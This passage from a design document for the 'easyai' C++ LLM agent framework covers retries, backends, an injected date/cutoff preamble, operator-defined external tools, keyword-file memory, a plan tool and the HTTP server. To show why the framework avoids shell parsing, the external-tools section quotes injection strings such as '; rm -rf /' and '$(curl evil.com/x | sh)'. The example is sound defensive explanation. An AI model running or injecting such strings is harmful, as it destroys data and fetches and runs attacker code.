*string concatenation* across deltas.  `PendingToolCall` accumulates
these in a `std::map<int, PendingToolCall>` so out-of-order arrivals
self-merge.

### HTTP retry layer (pre-stream only)

Transient transport failures are retried automatically.  Default
`Client::http_retries(5)` produces up to six total attempts per HTTP
call; `0` disables retries.  Backoff is exponential and capped:
**250 ms → 500 ms → 1 s → 2 s → 4 s → 4 s …**.  The retry loop wraps
all three call sites: the SSE `POST /v1/chat/completions` inside
`stream_chat`, plus `simple_get` / `simple_post` (used by the
management endpoints `health`, `metrics`, `props`, `list_models`,
`list_remote_tools`, `set_preset`).

Retry decision (`is_retryable_httplib`):

| Condition                                | Retry? |
|------------------------------------------|--------|
| `received_anything == true` (mid-stream) | **No** |
| `cancel_requested` set                   | **No** |
| HTTP 4xx                                 | **No** (auth / contract failure) |
| HTTP 5xx, no bytes streamed yet          | Yes |
| Connect refused / DNS fail / read or write timeout / SSL handshake | Yes |

The mid-stream rule is the load-bearing one.  Once the SSE buffer
flips `received_anything = true`, the model has already produced
visible tokens that the caller's `on_token` callback printed.  A
fresh attempt would replay those tokens and corrupt the agent
loop's history; the layer instead surfaces the partial turn as-is
and lets `retry_on_incomplete` (a HIGHER-LEVEL retry — see §3) deal
with it.

Each retry logs once via `easyai::log::error("[easyai-cli] HTTP
attempt N/M failed (REASON); retrying in Bms\n")`.  `easyai::log::error`
tees to stderr, so operators see the retry pattern in journalctl
output without `--verbose`.  When `--log-file PATH` is set on the
cli (default OFF since 2026-05-12) the same wire bytes also land
in `PATH` for postmortem.  Earlier versions auto-opened a
`/tmp/easyai-client-PID-EPOCH.log` unconditionally; that was
silenced because operators kept ending up with a stale `.log`
file per invocation whether they wanted one or not.

The same retry shape is replicated (with the same backoff schedule
but a libcurl-flavoured retryable-error set: `CURLE_COULDNT_CONNECT`,
`CURLE_OPERATION_TIMEDOUT`, `CURLE_RECV_ERROR`, `CURLE_SEND_ERROR`,
`CURLE_GOT_NOTHING`, `CURLE_PARTIAL_FILE`, plus 5xx) in the MCP
client (§6d) and the unified `web` tool's libcurl helpers — every
external HTTP boundary in the project goes through one of those
three retry loops.

---

## 5d. Backend abstraction (`easyai::Backend` / `LocalBackend` / `RemoteBackend`)

The local↔remote unification.  Every dual-mode CLI / agent we ship
has the same shape: accept `--model PATH` OR `--url BASE`, build the
right kind of engine, drive a streaming chat loop.  `Backend` hides
which side of the fork you ended up on.

```cpp
class Backend {
public:
    virtual bool        init       (std::string & err) = 0;
    virtual std::string chat       (const std::string & user_text,
                                    const Tokenizer & cb)               = 0;
    virtual void        reset      ()                                   = 0;
    virtual void        set_system (const std::string & text)           = 0;
    virtual void        set_sampling(float t, float p, int k, float m)  = 0;
    virtual std::string info       () const                             = 0;
    virtual std::string last_error () const                             = 0;
    virtual std::size_t tool_count () const                             = 0;
    virtual std::vector<std::pair<std::string,std::string>> tool_list() const = 0;
};
```

`LocalBackend` wraps `Engine` and ships in **libeasyai**.
`RemoteBackend` wraps `Client` and ships in **libeasyai-cli** — kept
in the cli library so the engine-only library doesn't drag in the
HTTP client.  Each has a public `Config` struct with the full
relevant knob surface (sandbox, allow_bash, sampling preset, KV
cache for local, TLS / timeout for remote).

The pImpl on each is a `std::unique_ptr<Impl>` so the public ABI
stays small and the lib can evolve internally without breaking
downstream linkers.  Backend's lifetime contract: the caller owns
the Backend; callbacks captured during `chat(text, cb)` fire
synchronously and are invalidated when chat returns.

## 5e. The Tier-1 façade (`easyai::Agent`)

`Agent` is the "extremely easy for all skill levels" entry point.
It owns one `Config` struct (LocalBackend's or RemoteBackend's,
chosen at construction), defers backend materialisation to the first
`ask()`, and re-resolves named presets at that point.

```cpp
struct Agent::Impl {
    LocalBackend::Config  local_cfg;
    RemoteBackend::Config remote_cfg;
    bool                  is_remote = false;
    std::unique_ptr<Backend> backend;     // built lazily on first ask()
    Tokenizer             token_cb;
    std::string           last_err;

    void ensure_started();   // resolve preset name, instantiate backend, init
};
```

Construction is cheap (`Agent("model.gguf")` doesn't touch the
filesystem or load any model); the model only loads when the user
actually calls `ask()`.  This matches what beginners expect — set
things up, ask once, get the answer.

The structural fields (model path, URL, sandbox, allow_bash) lock in
at first `ask()` because the Backend has been instantiated; the
"soft" fields (`set_system`, sampling overrides, on_token) keep
working through `Backend::set_*`.  `agent.backend()` returns the
materialised Backend reference for everything Agent doesn't surface
directly — that's the Tier-4 escape hatch.

Default toolset matches the rest of the framework: datetime + the
unified `web` tool on by default; the unified `fs` tool and bash off
until the user opts in via `.sandbox(...)` / `.allow_bash()`.  Remote mode
enables `with_tools = true` automatically so the model running on
the server side can call tools dispatched in the client process.

## 5c. AUTHORITATIVE preamble (datetime / knowledge-cutoff / memory vocabulary)

A real production hazard: every chat-template-friendly model has a
training cutoff.  Without a fresh wall-clock signal each turn, the
model will happily insist that "this year" is the year it was
trained, and confidently misreport leaders, prices, scores, and
weather.  And without a hint of what's in its persistent memory,
the model either burns a `keywords_knowledge` hop on every
question or skips memory entirely and goes to the web.  The fix
is well known but worth describing as it lives in this codebase,
because it interacts subtly with client-supplied system prompts.

**One builder, three binaries.** The preamble used to live as
`build_authoritative_preamble` inside `examples/server.cpp`, with
parallel partial copies in `local.cpp` and nothing in `cli.cpp`.
That drift was a smell — change the format and you'd silently miss
the others.  Since 2026-05-16 the builder lives in libeasyai:

```cpp
// include/easyai/preamble.hpp
namespace easyai::preamble {
    struct Options {
        bool        inject_datetime  = true;
        std::string knowledge_cutoff = "2024-10";
        std::string memory_root;        // empty → vocab block omitted
        bool        cite_sources     = false;
    };
    std::string build(const Options & opt);

    // ToolsetView + the two new builders (2026-05-26) — render the
    // closed-set rule, the active-tools enumeration, and the
    // canonical "default" system prompt from a single source of truth.
    struct ToolsetView { /* booleans + vector<Tool> active_tools */ };
    std::string tools_block(const ToolsetView & view);
    std::string build_builtin_system_prompt(const ToolsetView & view);
}
```

`easyai-server`, `easyai-local`, and `easyai-cli` all call the same
helpers; the binary picks which blocks make sense for its
deployment by toggling the option fields and the `ToolsetView`
booleans.

**What gets injected.** `easyai::preamble::build()` produces a
system-prompt suffix with up to three blocks, freshly stamped on
each call:

```
# AUTHORITATIVE DATE/TIME (do not ignore, do not second-guess)
Current date and time: 2026-04-26 23:14:08 -0300 (BRT).
Trust this over any training-data intuition about "today".
…

# KNOWLEDGE CUTOFF
Your training data ends around 2024-10.
For ANY claim about events, people, products, prices, releases,
leaders, scores, weather, or facts after that cutoff you MUST
either:
  1. Call a tool (web action=search/fetch, datetime, …) to verify, OR
  2. Explicitly state that you are not certain.
Never present a post-cutoff fact as known.

# MEMORY VOCABULARY (the keywords your private memory currently
has tagged — the FIRST place to look for anything you might
already know)
12 entries (most-common first; call search_knowledge(
keywords=["<name>", ...]) to recall):
easyai(8) claude(5) bitnet(3) build(3) iteration(2) …
```

Each block is conditional:
* Date/time + cutoff render only when `inject_datetime=true`.
* Memory vocabulary renders only when `memory_root` is set AND the
  store has at least one tagged entry. Empty store → no block, no
  wasted tokens.

**Block ordering (2026-05-26).** The vocab block is positioned at
the **tail** of the preamble, AFTER the KNOWLEDGE LOOP and CITE
SOURCES rules. The vocab is the only block that mutates between
requests (a `knowledge_save` shifts the keyword count map),
so putting it last means a memory write only invalidates the
SUFFIX of the prompt-eval KV cache. The stable date/cutoff/rules
prefix stays warm across writes.

`render_memory_vocabulary` itself caches the rendered string by
`(root_dir, directory mtime, file count)` — warm-path cost is one
`stat(2)` per request, not a full directory walk. Edge case:
filesystems with second-resolution mtime can serve up to one
second of stale vocab on rapid same-second writes that net to
zero file-count change — accepted because vocab is advisory; the
actual `search_knowledge` always hits the live index. See
SECURITY_AUDIT §23.3.

Cutoff date comes from `--knowledge-cutoff YYYY-MM` (default
`2024-10`); date format is `strftime("%Y-%m-%d %H:%M:%S %z (%Z)")`.
The vocabulary block is capped at the top 40 keywords (sorted count
desc, name asc) to bound token cost on large stores.

**Per-binary wire-up.**

| Binary | When called | inject_datetime | memory_root |
|---|---|---|---|
| `easyai-server` | per request | `true` | from `ctx.memory_root` (set by `--memory`) |
| `easyai-local`  | once at startup | `false` (would freeze "today") | from `args.rag_dir` (set by `--memory`) |
| `easyai-cli`    | when building the system prefix | `false` (remote server handles date/time) | from `args.rag_dir` (set by `--memory`) |

**Where it lands in the prompt.** Two cases, controlled by
`prepare_engine_for_request` in the server:

1. *Client supplied its own `system` message* (the opencode /
   Claude-Code / OpenAI-SDK pattern).  We walk the request's history
   in reverse and APPEND the preamble to the last `role:"system"`
   message we find.  The engine's `default_system` is set to the
   bare server default — no double system block.
2. *Client didn't supply a `system` message*.  We append the
   preamble to `ctx.default_system` and the engine renders that as
   its lone system message.

Either way exactly one system block reaches the chat template,
the preamble is in it, and the freshly-rendered timestamp + vocab
go through the standard chat-templates path (Qwen / Llama / Gemma /
DeepSeek all preserve system content verbatim).

**Per-request override.** `X-Easyai-Inject: on|off` HTTP header lets
QA runs disable the preamble without rebooting the server.  Default
remains on; the override exists for A/B regression suites comparing
pre-injection behaviour.  We deliberately did NOT make this a body
field — keeping it in the headers means OpenAI-compat client SDKs
that don't know about easyai pass through cleanly without trying to
forward the field to the model.

**Memory vocabulary cost.** The vocab renderer
(`easyai::tools::render_memory_vocabulary`) does a fresh disk scan
on every call (~10-50ms for typical stores, up to ~200ms for very
large ones). No persistent state — safe to call concurrently with
knowledge-tool writes (the underlying `RagStore` uses `shared_mutex`).
Scan cost is rounding error against inference latency, so the
server pays it per request; `local` and `cli` pay it once.

## 5f. External tools — operator-defined commands via JSON manifests

Lives in `src/external_tools.cpp` (the implementation) and
`include/easyai/external_tools.hpp` (the public API). User-facing
documentation: [`EXTERNAL_TOOLS.md`](EXTERNAL_TOOLS.md) is the
authoritative guide; `manual.md` §3.3.4 is the schema quick-ref.
Security review: `SECURITY_AUDIT.md` §16. This section describes
*why* the subsystem is shaped the way it is.

### Directory of files, not a single file

The deploy surface is a directory of `EASYAI-<name>.tools` files,
not a single manifest. Three reasons:

1. **Per-file fault isolation.** A syntax error in
   `EASYAI-experimental.tools` does NOT prevent
   `EASYAI-system.tools` from loading. The agent starts with what
   parsed; the operator sees the broken file in the journal and
   fixes it without an outage.
2. **Multi-author collaboration.** System tools belong to the
   sysadmin, deploy tools to the SRE, personal helpers to the
   user. One file per owner means PRs route cleanly and disabling
   one pack doesn't churn the others.
3. **No-touch deploy.** The systemd unit unconditionally passes
   `--external-tools /etc/easyai/external-tools`. An empty dir is
   a normal state (no extra tools registered). Operators add new
   capabilities by dropping a file in the dir and restarting the
   service — no `systemctl edit` of the unit, no template
   re-render, no install-script re-run.

The single-file API (`load_external_tools_from_json`) remains
public for unit testing and programmatic use; the directory API
(`load_external_tools_from_dir`) calls it once per matching file
and aggregates results.

### The trust boundary

Built-in tools (`datetime`, the unified `web` and `fs` tools, `bash`,
the `knowledge_*` tools, …) are C++ code we wrote and reviewed. Adding a new built-in is a code change,
goes through review, ships in a binary release. That's the right
process for tools that the agent's *author* controls.

But there's a different need: the agent's *operator* — the person
running easyai-server in a specific environment — wants the model
to be able to run *their* CLIs (`/opt/internal/bin/deploy-cli`,
`/usr/local/bin/our-jq-wrapper`, an internal Python script). Today
their only options are:

1. **Hard-code the tool in C++** — needs a fork of easyai. Bad
   ergonomics, ties them to our release cadence.
2. **Expose `bash`** — gives the model a `system()` equivalent.
   No safety nets the operator can pre-declare.
3. **Wrap each command in a sidecar HTTP service** — heavyweight,
   adds another component to monitor.

The manifest is the missing fourth option. It's a YAML/sudoers
shape: a per-deploy artefact owned by the operator, declaring
exactly which commands the model is allowed to dispatch, what
arguments each takes, and the resource caps. The model fills in
parameter values; the operator picks the surface area.

> **Trust direction:** the manifest is a *deploy artefact*, not a
> chat artefact. It's written by humans, code-reviewed, version-
> controlled, and shipped alongside the binary. The model never
> writes it; the model only consumes the surface it exposes.

### Why fork+execve (no shell)

The dispatch path is `fork()` + `execve(absolute_path, argv, envp)`.
There is no `/bin/sh -c …` anywhere. Consequences:

- A model argument that contains `; rm -rf /` is one argv element,
  not a command separator.
- A model argument that contains `$(curl evil.com/x | sh)` is one
  argv element, not a substitution.
- A model argument that contains backticks, redirects, glob
  metacharacters, or `&&` is one argv element. None of those
  characters are special outside a shell.

This is a structural guarantee, not a "we sanitised the inputs"
guarantee. Sanitisation is a moving target; structural absence of
a parser is permanent. The same reason `subprocess.run([..],
shell=False)` is safer than `shell=True` in Python — we just refuse
to even *expose* the unsafe shape.

The cost: pipes, redirects, `&&`, globbing — none of those work
without an explicit shell tool. Operators who need them keep using
the `bash` builtin (which is honest about being unsafe). The
manifest is for the 90% that doesn't need a shell.

### Why absolute paths only (no PATH lookup)

`command` MUST start with `/`. Consequences:

- No PATH-hijack: an attacker who can write `~/.local/bin/uname`
  can't trick the agent into running their `uname` instead of
  `/usr/bin/uname`.
- No "works in dev, breaks in prod when PATH differs."
- Manifest is portable across environments only insofar as the
  operator chose to make it so (different distros = different
  paths; the operator picks one and owns the deploy).

`PATH` *can* be passed through via `env_passthrough` for tools that
internally `exec` other binaries (git invokes git-log, …), but the
top-level command is locked.

### Why whole-element placeholders only

Argv templates accept `"{name}"` as a complete element, never
embedded (`"--flag={x}"` is rejected at load). Two reasons:

1. **Quoting fragility.** If we allowed embedded placeholders, an
   operator would write `["--filter={query}"]` and assume the
   library handles quoting. But there's nothing to quote — it's
   already an argv element. The first time someone tries
   `query = "a b c"` they'd get a passing test; the first time
   someone tries `query = '";rm -rf"'` they'd discover that
   argv-element interpolation has no escaping rules. We refuse to
   build a "safe" interpolator that's actually a footgun.

2. **Invariant simplicity.** "The model's value fills exactly one
   argv slot" is provable by inspection. "The model's value is
   substituted at position k of element j" is not — depends on
   surrounding literals, on whether `j` ends with a quote, on
   whether the wrapped command parses `--flag=` differently from
   `--flag `.

Operators who need both literal and dynamic content split the
element: `["--flag", "{x}"]`. The wrapped binary almost always
accepts the split form (it's the standard GNU/POSIX shape).

### Why the hard caps

Every numeric cap closes a class of attack:

| Cap | Value | What it stops |
| --- | --- | --- |
| `kMaxManifestBytes` | 1 MiB | Pathological-JSON DoS at parse time. |
| `kMaxToolsPerManifest` | 128 | Reflective-add: model spending its prompt budget enumerating tools. |
| `kMaxParamsPerTool` | 32 | Schema-validator quadratic blowup. |
| `kMaxArgvElements` | 256 | argv overflow / kernel `ARG_MAX` exhaustion. |
| `kMaxArgElementBytes` | 4 KiB | Single overlong argv string. |
| `kMaxEnvPassthrough` | 16 | Env table size; also bounds per-call envp build cost. |
| `kTimeoutMin / Max` | 100 ms / 5 min | Floor: a 0-timeout would race; ceiling: agent-loop deadlock prevention. |
| `kOutputCapMin / Max` | 1 KiB / 4 MiB | Floor: enough to fit any sensible response; ceiling: per-call RAM bound. |
| `kMaxFdScan` | 65 536 | Bounds the `close()` loop in the child between `fork` and `execve` so `RLIMIT_NOFILE = RLIM_INFINITY` doesn't either leak fds (cast wraps to `-1`) or stall exec by closing 1 M+ fds. |

The caps are deliberately tight — "cannot conceivably be needed by a
legitimate manifest, can plausibly be tried by a hostile one."
Loosen with a written reason or not at all.

### Why `fs(action="cwd")` and the startup chdir

The model has no implicit awareness of where it is on disk. With
`fs` actions rooted at `/` (a virtualised view, not the real /),
the model thinks it's in a clean filesystem starting from /; with
`bash`, the model thinks it's in some shell. Both are abstractions
over the *operator's chosen sandbox directory*.

Without `fs(action="cwd")`, the model has to either:

- Assume relative paths work (fragile — depends on the operator's
  invocation), or
- Call `bash pwd` (works but burns a tool call to learn one path).

`fs(action="cwd")` is the explicit answer. The CLIs `chdir(--sandbox)`
at startup, the action returns `getcwd()`, the model has a single
source of truth for "where am I". The external-tools manifest's
`cwd: "$SANDBOX"` resolves to the same directory at load time — every
fs-flavoured surface (built-in or operator-declared) agrees on what
"here" means.

The unified `fs` tool ships both `cwd` and `sandbox` actions, so
whenever it's registered (i.e. whenever `--sandbox` / `--allow-fs` /
`--allow-bash` are on — see §5 "Sandbox + tool defaults") both are
available without separate registration. The pair lets the model
distinguish the live process cwd (`fs(action="cwd")`, can drift) from
the boundary it's scoped to (`fs(action="sandbox")`, pinned at
registration).

### Where this fits in the four-tier API rule (§1b)

| Tier | Audience | Surface |
| --- | --- | --- |
| 1 — façade | beginner | `easyai::Agent a("model.gguf")` — no manifest, builtins only. |
| 2 — fluent | intermediate | `a.allow_bash().sandbox("/srv/x")` — opt into sharper tools. |
| 3 — operator | deployment | `--external-tools /etc/easyai/external-tools` — drop `EASYAI-*.tools` files declaring your own surface. *This subsystem.* |
| 4 — escape hatch | extension | `Tool::builder().handle(...)` in C++ — in-process tool with shared state. |

Tier 3 is intentionally not in C++. Operators who can write a JSON
file but not C++ are still production users; their threat model is
deserving of the same fork+execve hardening that the C++ Toolbelt
gets. The manifest is the operator surface for "I have a binary,
let the model use it" without leaving JSON.

### What the subsystem does NOT do

- **No isolation.** The subprocess runs with the agent's full
  uid/gid. We close inheritance leaks (fds, env), bound resource
  use (timeout, output, RAM), and remove the shell as an attack
  surface — but we do not ship a chroot, namespace, or seccomp
  policy. For deployments needing isolation, run easyai-server
  inside a container / firejail / unprivileged user.
- **No retry / supervisor.** Each call is a one-shot fork+exec.
  Crashes are reported as `exit=signal:N`; the agent decides
  whether to retry.
- **No log rotation.** Per-call output is captured into RAM and
  returned to the model. We do not write to disk.

These are deliberate non-goals — adding any of them would expand
the trust surface in ways the operator didn't sign up for.

## 5g. memory — persistent registry / long-term memory

Lives in `src/rag_tools.cpp` and `include/easyai/rag_tools.hpp`.
User-facing documentation: [`RAG.md`](RAG.md). Operator guide:
[`LINUX_SERVER.md`](LINUX_SERVER.md). This section describes *why*
the subsystem is shaped the way it is. The knowledge tools are **a
passive RAG technique** — keyword-indexed Markdown files the agent
saves and searches itself, no embedding model or vector store.

### Architecture at a glance

```
┌─────────────────────────────────────────────────────────────────┐
│                            MODEL                                 │
│          (sees SEVEN keyword-only knowledge tools)               │
│                                                                  │
│   knowledge_save, knowledge_append, search_knowledge,            │
│   knowledge_load, knowledge_list, knowledge_delete,              │
│   keywords_knowledge                                             │
└─────────────────────────────────────────────────────────────────┘
                                │
                                │  tool_call(name, arguments_json)
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│             easyai::Engine  /  easyai::Client                    │
│   dispatch by name → tools[name].handler(call) → ToolResult      │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                src/rag_tools.cpp — RagStore                      │
│                                                                  │
│   ┌──────────────────┐       ┌────────────────────────────────┐ │
│   │   std::mutex mu  │ ◄───► │ std::map<key, EntryMeta>       │ │
│   │  (one per store) │       │   keywords + mtime + bytes     │ │
│   │                  │       │   key = sorted keywords joined │ │
│   │                  │       │   by "_" → filename             │ │
│   │                  │       │   lazy-loaded from disk on     │ │
│   │                  │       │   first call, refreshed by     │ │
│   │                  │       │   every save / delete           │ │
│   └──────────────────┘       └────────────────────────────────┘ │
│                                                                  │
│   reads (search/list/keywords): index lookup, no disk read       │
│   load:   one file read off disk (body ≤ 256 KiB)                │
│   save:   atomic tempfile + rename(2), idempotent                │
│   delete: unlink + index erase, idempotent                       │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│             /var/lib/easyai/rag/    (filesystem)                 │
│                                                                  │
│   <sorted_keywords>.md  one file per entry, plain Markdown       │
│   <sorted_keywords>.md.tmp.<pid> transient — only during a save  │
│   README.md             operator-readable, no `keywords:` header │
└─────────────────────────────────────────────────────────────────┘
```

The flow has four invariants worth calling out:

1. **The model is the only writer.** The `knowledge_save` and
   `knowledge_delete` tools are called from the model's tool-call
   loop; the operator may hand-edit files but the runtime never
   auto-writes from the server side. This makes "what's in memory"
   a function of "what the agent decided to remember", which is the
   part vector stores get wrong.
2. **The index is small.** Every `search_knowledge` /
   `knowledge_list` / `keywords_knowledge` call stays in memory —
   no disk read. The body is only read when the model commits to
   one specific entry via `knowledge_load`. A 1000-entry store with
   avg 200-byte body uses ~200 KiB on disk and a few hundred bytes
   per entry in the index.
3. **Atomic-rename writes.** The tempfile + rename pattern means a
   concurrent reader (another `knowledge_load` while a save is in
   flight) sees the OLD body or the NEW body but never a torn write.
   No locking needed on the read path.
4. **Path-safety by regex.** Keyword identifiers must match
   `^[A-Za-z0-9._+-]+$`. Keywords are sorted and joined by `_` to
   form the filename (concatenated with `.md`) — the regex closes
   path-traversal at parse time. There is no other access-control
   layer; the filesystem ACL on `/var/lib/easyai/rag/` is the
   deployment boundary.

### Why a tag registry, not a vector store

Vector stores assume you have a corpus that nobody classified. The
agent IS the classifier — when it saves something, it just told you
in clear language what the entry is about. Putting that
classification in the filename + a small `keywords:` header lets
us look up entries in O(1) per lookup with zero embedding inference.

When we later want progressive recall (auto-inject the K most
relevant entries on session start), THAT layer can do similarity
scoring on top. The knowledge tools themselves stay simple: just
files and keywords. The composition order matters: vector store on
top of the knowledge tools works fine; the knowledge tools on top of
a vector store would be either redundant or fighting the index.

### Why one Markdown file per entry, not a database

The dir is human-inspectable. Operator can `cat`, `vim`, `grep`,
back up with `tar`, share with `scp`. There is no schema migration,
no SQLite version drift, no "the agent's memory is a black box."
The agent's mistakes are visible; the agent's good calls are
visible; the operator can curate either by hand.

A database would buy us atomicity and indexing. We get atomicity
from `rename(2)`. We get indexing from a 200-line in-memory map
that's rebuilt on first use (cost: parse N small files once per
process — fast).

### Seven keyword-only tools

The surface is **seven separate tools**: `knowledge_save`,
`knowledge_append`, `search_knowledge`, `knowledge_load`,
`knowledge_list`, `knowledge_delete`, `keywords_knowledge`. There
is no unified `memory(action=...)` dispatcher — each tool has its
own flat schema and handler.

Keywords ARE the identifier. There is no `title` parameter — the
sorted keywords joined by `_` become the filename. This makes the
naming deterministic and search-friendly: any subset of keywords
finds related entries.

Immutable entries use the `fix-` prefix (e.g. `fix-easyai_design`).
Pass `fix=true` on `knowledge_save` to mint one;
`knowledge_save` refuses to overwrite it and `knowledge_delete`
refuses to remove it.

The factory `knowledge_split_tools(dir)` returns a
`std::vector<Tool>` containing all seven tools.

The natural workflow is: save (write a new memory), append (grow an
existing one without losing its body), search + load (read in two
steps because previewing keeps the prompt slim), list (browse),
delete (curate), keywords (vocabulary review).

### Why max 4 entries per `knowledge_load`

Past 4, the model is almost always trying to drown the prompt in
stale content. The cap forces "preview first, narrow second" —
which is the right ergonomics for the agent loop.

### Why operator-encouraging language in the descriptions

The tool descriptions are the model's incentive layer. Generic
"saves a note" descriptions produce a model that occasionally
remembers things. Explicit "USE THIS AGGRESSIVELY for the user's
preferences, project facts, recipes you found, things the user
might re-ask" produces a model that builds a useful registry over
time.

This is the same lever the system prompt uses, but at finer
granularity — one tool's behaviour at a time. As we accumulate
operational experience we'll tune the descriptions further.

### Where the knowledge tools fit in the four-tier API rule

| Tier | Audience | knowledge surface |
| --- | --- | --- |
| 1 — façade | beginner | `easyai::Agent` could opt into the knowledge tools with a single setter (future). |
| 2 — fluent | intermediate | One factory: `knowledge_split_tools(dir)` returns `std::vector<Tool>` with all seven tools. |
| 3 — operator | deployment | `--memory <dir>` flag on all three CLIs (legacy alias `--RAG`); systemd unit passes `--memory` for free. |
| 4 — escape hatch | extension | The `RagStore` private class is replaceable: a future variant could swap files for SQLite or a vector store while keeping the same handler signatures. |

### What the knowledge tools are not

- **Not a knowledge base.** The agent decides what goes in. Stale
  entries persist until the agent (or operator) deletes them.
- **Not a search engine.** Keyword exact match, no semantic search,
  no fuzzy match. We ship the simple thing.
- **Not multi-tenant.** One process, one memory dir. Per-user
  namespaces are on the roadmap.
- **Not transactional across calls.** Each tool call commits its
  own state. There's no `BEGIN ... COMMIT`. The model is the
  consistency layer.

## 5h. Plan — agent-visible task list

Lives in `src/plan.cpp` + `include/easyai/plan.hpp`. User-facing
documentation: `AI_TOOLS.md` §"plan" and the auto-register flow
in `src/cli.cpp`. This section describes the architectural shape
and the design rationale behind the schema.

### One tool, four actions

`Plan::tool()` returns a SINGLE `easyai::Tool` whose schema
dispatches on an `action` enum: `add | update | delete | list`.
A multi-action shape (vs. four separate tools) is deliberate:

1. **Smaller tool catalogue.** The model's tool-pick fan-out is
   one entry, not four.  Weak / 1-bit-quant models that get
   confused by long catalogues stay fluent.
2. **Symmetric input shape.** Every action accepts the same
   `id` / `text` / `status` / `items` field set; the model
   doesn't need to remember "is the field name `text` or `task`?"
   per action.

The trade-off — one less informative tool name in audit logs — is
worth it for catalogue compactness.  The knowledge tools (§5g), by
contrast, are split into seven separate tools — the tool name itself
distinguishes calls in hooks / logs, and operators read the rendered
checklist (plan) or the on-disk Markdown (knowledge), not the raw
tool calls.

### Statuses encode display intent, not workflow

Five statuses: **pending | working | done | error | deleted.**
Each maps to a terminal rendering style:

| Status   | Box   | ANSI                        | Intent |
|----------|-------|-----------------------------|--------|
| pending  | `[ ]` | bold                        | active, not started |
| working  | `[~]` | bold cyan                   | active, in progress |
| done     | `[x]` | dim                         | completed |
| error    | `[!]` | red                         | failed (model decides) |
| deleted  | `[-]` | dim + strikethrough         | removed but visible |

`deleted` is a soft delete — the entry stays in the rendered list
with a strikethrough, so the user sees what the model abandoned.
A subsequent `clear()` (no tool action exposes it) is the only
way to actually drop entries.  The choice trades memory growth
on long sessions for transparency: the user can scroll back and
see "yes, the model considered X, then deleted it" rather than
"the model silently never mentioned X."

`render(out, color=true)` emits the ANSI sequences; the same
function with `color=false` emits a plain markdown checklist for
consumption by the MODEL (we never show the model coloured
escape sequences in the tool result, only the user's terminal
sees them).  Two callers respect the operator's `Style.color`
flag: `ui::render_plan` and `Streaming::attach(Plan&)`.

### Batch mode (max 20 items)

Each action accepts EITHER single-item top-level fields
(`id`, `text`, `status`) OR an `items` array of up to 20 objects.
The 20-item ceiling is enforced in the handler; larger arrays
return an error.  The cap is small on purpose:

- A turn that wants to enqueue 50 sub-steps has a planning
  problem, not a batching problem.  The right answer is to
  zoom out, not to send a bigger batch.
- Schema validators that walk every item linearly want a small
  upper bound.
- 20 fits a typical "morning of work" plan (read-write-test-…)
  without forcing the model into multiple add-batches.

The fluent rule: `add` accepts `[{text}]`, `update` accepts
`[{id, text?, status?}]`, `delete` accepts `[{id}]`.  Mixing
single-field and `items` in the same call is allowed; `items`
wins.  `delete` with `id="all"` is the explicit "wipe the
plan" gesture (no `items`, no per-id calls).

### Why `update` is not just `add` with a known id

Before the redesign, the schema only had `add | start | done | list`.
A model wanting to fix a typo in step 3 had no way to do it: re-adding
created a duplicate entry, and `start`/`done` only flipped status.
The model would noisily try to mutate the list by clearing and
re-adding, which broke ID stability and confused the user reading
the live checklist.

`update` is the cleanest fix.  It takes the existing id, applies
non-empty `text` and/or `status`, fires `on_change` once, and
preserves the id (which the model has likely already cited in
its visible reasoning).  The tool description tells the model
explicitly: *"never re-add — use update to change text or
status."*  The rule is short enough that even small models
follow it.

### `on_change` callback — the live checklist

Every mutation fires `Plan::on_change(const Plan &)`.  The CLI
binary's `Streaming::attach(Plan&)` wires that to a re-render
under the spinner's lock, so the operator sees the checklist
update inline as the model plans / executes.  This is the
load-bearing UX feature — the plan isn't a "nice to have"
status report, it's a real-time signal that the model is
making progress.

The callback runs synchronously on the dispatching thread
(typically the agent loop).  Subscribers must be cheap; the
default rendered path is one `ostringstream` build + a single
`spinner_.write()` and that's it.

### Plan vs. knowledge tools vs. external-tools

Three persistence-shaped tool families coexist; their roles
are distinct:

| Tool      | Lifetime          | Audience       | Writer |
|-----------|-------------------|----------------|--------|
| Plan      | one chat session  | the user, live | model  |
| `knowledge_*` | across sessions | the model    | model  |
| Manifest  | across deploys    | the operator  | operator |

A plan item is the next ten minutes of work.  A knowledge entry is
"things the model wants to remember next time."  A manifest
tool is "binaries the operator pre-authorised."  Confusing them
produces predictable failure modes (knowledge entries that are stale
within an hour because the model used them as a plan; manifest
tools the model never calls because it expects them to behave
like the knowledge tools).  Keeping the surfaces distinct keeps the
model oriented.

---

## 6. The HTTP server

The server is **one-engine**, **one-mutex**, **one-process**. No connection
pool, no engine pool, no warmup workers. That's enough to compete with
`llama-server` on a single-user machine and is straightforward to scale by
running N processes behind a load balancer.

### Per-request flow

```
┌──────── POST /v1/chat/completions ─────────┐
│ 1. Parse JSON body                         │
│ 2. acquire engine_mu                        │
│ 3. reset_engine_defaults() — system, tools, │
│    sampling all back to ambient defaults    │
│ 4. If body.tools present → swap tools for   │
│    stub-handler shells (no local dispatch)  │
│ 5. Apply per-request sampling overrides     │
│ 6. Peel off any preset prefix in last user  │
│    message ("creative 0.9 …")               │
│ 7. replace_history(messages[:-1])           │
│ 8. If tools came from request:              │
│      generate_one() → return tool_calls     │
│    Else (server tools):                     │
│      chat(last_user) → loops until done     │
│ 9. Build OpenAI envelope, respond           │
│10. release engine_mu                        │
└────────────────────────────────────────────┘
```

### "Server-as-competitor" semantics

Two override points:

| What the request brings   | What the server does                                                 |
|---------------------------|-----------------------------------------------------------------------|
| `system` message present  | use it; ignore `system.txt`                                           |
| `system` message absent   | inject `system.txt` as message[0]                                     |
| `tools` array present     | register stubs; *forward* tool_calls back to client (single-pass)     |
| `tools` array absent      | use built-in toolbelt; *dispatch* server-side (multi-hop loop)        |
| `temperature` etc present | apply for this request                                                |
| `temperature` etc absent  | use ambient preset                                                    |

A client like Claude Code can use the server in two completely different
modes — bring-your-own-everything, or trust the server defaults — without
any configuration switch.

### Why per-request `replace_history` instead of incremental append?

Stateless requests are easier to reason about. The cost is that we re-decode
the prompt every time, but llama.cpp's KV cache lookup is fast (we feed only
the suffix beyond what's already cached, when caching across requests is
possible). Trading a little perf for *no chance of cross-request leakage* is
worth it for v0.

### CORS

Permissive (`*`) by default so a static HTML page on `file://` or another
origin can talk to the server. Tighten via a reverse proxy if exposing on a
network you don't fully control.

### What "stop" looks like

